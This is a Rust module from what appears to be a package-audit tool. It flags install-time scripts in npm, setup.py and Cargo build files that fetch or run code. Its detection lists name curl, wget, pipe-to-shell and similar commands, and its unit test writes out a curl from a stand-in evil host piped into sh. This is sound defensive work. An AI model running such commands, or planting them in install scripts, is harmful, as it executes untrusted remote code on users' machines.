//! Install-time execution: npm lifecycle scripts, `setup.py` and Cargo
//! build scripts that download or run code when a package is installed.
//! Each finding says what runs and, for downloads, which host they come
//! from. Fetching a prebuilt platform binary is a common build step and
//! is weak evidence; piping a download into a shell is strong.

use super::line_of;
use super::typosquat::{typosquat, typosquat_finding, NPM_POPULAR};
use crate::architecture::Confidence;
use crate::audit::{finding, Finding, Severity, Strength, INSTALL_SCRIPT};

/// npm lifecycle scripts that run when the package is installed.
const INSTALL_HOOKS: &[&str] = &["preinstall", "install", "postinstall", "prepare"];

/// Commands in an install script that fetch or run hidden code.
const RISKY_COMMANDS: &[&str] = &[
    "curl ",
    "wget ",
    "| sh",
    "|sh",
    "| bash",
    "|bash",
    "node -e",
    "eval ",
    "powershell",
    "Invoke-WebRequest",
    "http://",
    "https://",
    "base64",
];

/// A download piped straight into a shell.
const PIPE_TO_SHELL: &[&str] = &["| sh", "|sh", "| bash", "|bash"];

/// Signs that an install script fetches or builds a prebuilt binary for
/// the current platform.
const PLATFORM_BINARY: &[&str] = &[
    "prebuild",
    "node-pre-gyp",
    "node-gyp-build",
    "releases/download",
    "release/download",
    "process.platform",
];

/// The host of the first URL in a command.
fn url_host(command: &str) -> Option<&str> {
    let start = command
        .find("https://")
        .map(|i| i + 8)
        .or_else(|| command.find("http://").map(|i| i + 7))?;
    let rest = &command[start..];
    let end = rest
        .find(|c: char| !(c.is_ascii_alphanumeric() || matches!(c, '.' | '-')))
        .unwrap_or(rest.len());
    (end > 0).then(|| &rest[..end])
}

/// A finding for an install hook that runs a risky command.
fn risky_hook(
    file: &str,
    line: Option<usize>,
    hook: &str,
    command: &str,
    risky: &str,
    private: bool,
) -> Finding {
    let prepare = hook == "prepare";
    let mut f = finding(
        if prepare {
            Severity::Medium
        } else {
            Severity::High
        },
        INSTALL_SCRIPT,
        file,
        line,
        format!(
            "\"{hook}\" script uses `{}`: it fetches or runs code when the package is installed",
            risky.trim()
        ),
    )
    .signal(format!("runs on install: {hook}"));
    if let Some(host) = url_host(command) {
        f = f.signal(format!(
            "downloads from {}",
            crate::safe_text::sanitize(host)
        ));
    }
    let piped = PIPE_TO_SHELL.iter().any(|t| command.contains(t));
    if prepare {
        f.weaken("prepare runs for local and git installs, not registry installs");
    } else if piped {
        f.evidence.strength = Strength::Strong;
        f.confidence = Confidence::High;
        f.evidence
            .signals
            .push("pipes a download into a shell".to_string());
    } else if PLATFORM_BINARY.iter().any(|t| command.contains(t)) {
        f.weaken("fetches a prebuilt platform binary, a common build step");
    }
    if private && f.evidence.strength != Strength::Weak {
        f.confidence = match f.confidence {
            Confidence::High => Confidence::Medium,
            _ => Confidence::Low,
        };
        f.evidence
            .signals
            .push("private package: only its own developers install it".to_string());
    }
    f
}

pub(crate) fn package_json(file: &str, text: &str) -> Vec<Finding> {
    let mut out = Vec::new();
    let Ok(json) = serde_json::from_str::<serde_json::Value>(text) else {
        return out;
    };

    // A private package is never installed as someone else's dependency,
    // so its plain install hooks only run for its own developers.
    let private = json.get("private").and_then(|p| p.as_bool()) == Some(true);
    if let Some(scripts) = json.get("scripts").and_then(|s| s.as_object()) {
        for hook in INSTALL_HOOKS {
            let Some(command) = scripts.get(*hook).and_then(|c| c.as_str()) else {
                continue;
            };
            let line = line_of(text, &format!("\"{hook}\""));
            if let Some(risky) = RISKY_COMMANDS.iter().find(|t| command.contains(**t)) {
                out.push(risky_hook(file, line, hook, command, risky, private));
            } else if *hook != "prepare" && !private {
                out.push(
                    finding(
                        Severity::Low,
                        INSTALL_SCRIPT,
                        file,
                        line,
                        format!(
                            "\"{hook}\" script runs automatically when the package is installed"
                        ),
                    )
                    .signal(format!("runs on install: {hook}")),
                );
            }
        }
    }

    for section in [
        "dependencies",
        "devDependencies",
        "optionalDependencies",
        "peerDependencies",
    ] {
        let Some(deps) = json.get(section).and_then(|d| d.as_object()) else {
            continue;
        };
        for name in deps.keys() {
            if let Some(popular) = typosquat(name, NPM_POPULAR, false) {
                out.push(typosquat_finding(
                    file,
                    line_of(text, &format!("\"{name}\"")),
                    name,
                    popular,
                ));
            }
        }
    }
    out
}

/// Calls in `setup.py` that run commands or reach the network at install time.
const SETUP_PY_CALLS: &[&str] = &[
    "os.system(",
    "subprocess.",
    "urlopen(",
    "urllib.request",
    "requests.get(",
    "requests.post(",
    "socket.",
    "exec(",
    "eval(",
];

pub(crate) fn setup_py(file: &str, text: &str) -> Vec<Finding> {
    text.lines()
        .enumerate()
        .filter(|(_, line)| !line.trim_start().starts_with('#'))
        .filter_map(|(i, line)| {
            let call = SETUP_PY_CALLS.iter().find(|t| line.contains(**t))?;
            let f = finding(
                Severity::Medium,
                INSTALL_SCRIPT,
                file,
                Some(i + 1),
                format!("setup.py calls `{call}`: this runs when the package is installed"),
            )
            .signal("runs on install: setup.py");
            Some(match url_host(line) {
                Some(host) => f.signal(format!(
                    "downloads from {}",
                    crate::safe_text::sanitize(host)
                )),
                None => f,
            })
        })
        .collect()
}

/// Signs that a Cargo build script reaches the network.
const BUILD_RS_NETWORK: &[&str] = &[
    "TcpStream",
    "reqwest",
    "ureq::",
    "curl",
    "wget",
    "http://",
    "https://",
];

pub(crate) fn build_rs(file: &str, text: &str) -> Vec<Finding> {
    let mut out = Vec::new();
    let mut command_reported = false;
    for (i, line) in text.lines().enumerate() {
        if line.trim_start().starts_with("//") {
            continue;
        }
        if let Some(net) = BUILD_RS_NETWORK.iter().find(|t| line.contains(**t)) {
            let f = finding(
                Severity::Medium,
                INSTALL_SCRIPT,
                file,
                Some(i + 1),
                format!("build.rs mentions `{net}`: build scripts that download code run on every build"),
            )
            .signal("runs on build: build.rs");
            out.push(match url_host(line) {
                Some(host) => f.signal(format!(
                    "downloads from {}",
                    crate::safe_text::sanitize(host)
                )),
                None => f,
            });
        } else if !command_reported && line.contains("Command::new(") {
            command_reported = true;
            out.push(finding(
                Severity::Low,
                INSTALL_SCRIPT,
                file,
                Some(i + 1),
                "build.rs runs an external program at build time".to_string(),
            ));
        }
    }
    out
}

#[cfg(test)]
mod tests {
    use super::url_host;

    #[test]
    fn the_download_host_is_the_first_urls() {
        assert_eq!(
            url_host("curl -s https://evil.example.com/x.sh | sh"),
            Some("evil.example.com")
        );
        assert_eq!(url_host("wget http://10.0.0.1:8080/a"), Some("10.0.0.1"));
        assert_eq!(url_host("node install.js"), None);
    }
}
